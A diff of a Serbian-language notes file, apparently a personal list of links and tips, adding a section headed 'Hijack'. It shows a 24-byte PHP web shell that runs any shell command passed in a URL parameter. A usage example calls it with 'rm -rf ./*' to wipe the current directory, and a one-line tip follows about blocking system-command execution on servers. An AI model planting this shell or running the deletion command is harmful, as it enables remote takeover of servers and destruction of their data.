@@ -78,10 +78,18 @@ https://usk.rs/logo/index.php
 
 https://www.ascii-code.com/
 
+## MALO ZNANJA NIJE NA ODMET
+
 ### HIJACK
 
 Hijack (24 bytes - littlebyte.php): <?php echo `$_GET['t']`; ?>
+
+### UPOTREBA - BRISE SVE U TRENUTNOM DIREKTORIJUMU
+
 Upotreba: https://domen.tld/littlebyte.php?t=rm -rf ./*
+
+### ZASTITA
+
 Na serveru zabraniti izvrsavanje sistemskih komandi.
 
 
